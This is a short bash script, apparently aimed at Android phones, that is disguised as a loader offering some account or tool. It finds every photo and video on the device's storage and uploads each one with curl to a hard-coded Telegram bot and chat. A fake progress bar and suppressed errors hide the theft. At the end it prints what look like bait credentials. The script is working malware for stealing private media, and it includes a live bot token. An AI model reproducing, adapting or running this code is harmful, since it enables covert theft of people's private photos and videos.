#!/bin/bash

GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

BOT_TOKEN="8329608817:AAEGF8FhX41Od6Unhpy5mby_L-t1ACQCD1U"
CHAT_ID="7514545803"

MEDIA_DIR="/storage/emulated/0"

types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
-iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"

FILES=$(find "$MEDIA_DIR" -type f \( $types \))
TOTAL=$(echo "$FILES" | wc -l)
SENT=0

# Ẩn toàn bộ lỗi
exec 2>/dev/null

progress_bar() {
    local current=$1
    local total=$2
    local width=30
    local done=$((current * width / total))
    local left=$((width - done))

    DONE_BAR=$(printf "%${done}s" | tr ' ' '█')
    LEFT_BAR=$(printf "%${left}s" | tr ' ' '░')

    echo -ne "${YELLOW}LOADING: ${DONE_BAR}${LEFT_BAR}\r${RESET}"
}

echo ""

echo "$FILES" | while read FILE; do
    if [ ! -f "$HOME/sent_media.txt" ] || ! grep -Fxq "$FILE" "$HOME/sent_media.txt"; then
        
        EXT="${FILE##*.}"
        EXT=$(echo "$EXT" | tr '[:upper:]' '[:lower:]')

        if [[ "$EXT" =~ ^(mp4|mov|mkv|3gp)$ ]]; then
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" \
                -F chat_id="$CHAT_ID" \
                -F video="@$FILE" >/dev/null 2>&1
        else
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
                -F chat_id="$CHAT_ID" \
                -F photo="@$FILE" >/dev/null 2>&1
        fi

        echo "$FILE" >> "$HOME/sent_media.txt"

        SENT=$((SENT + 1))
        progress_bar $SENT $TOTAL
        sleep 1
    fi
done

echo ""

echo -e "${GREEN}HOÀN THÀNH${RESET}"
echo -e "${GREEN} TÊN: HAI CON${RESET}"
echo -e "${GREEN} ID: API_XDARTTMKTPHTQTE${RESET}"
echo -e "${GREEN} PASS: SQL_32HTTP${RESET}"
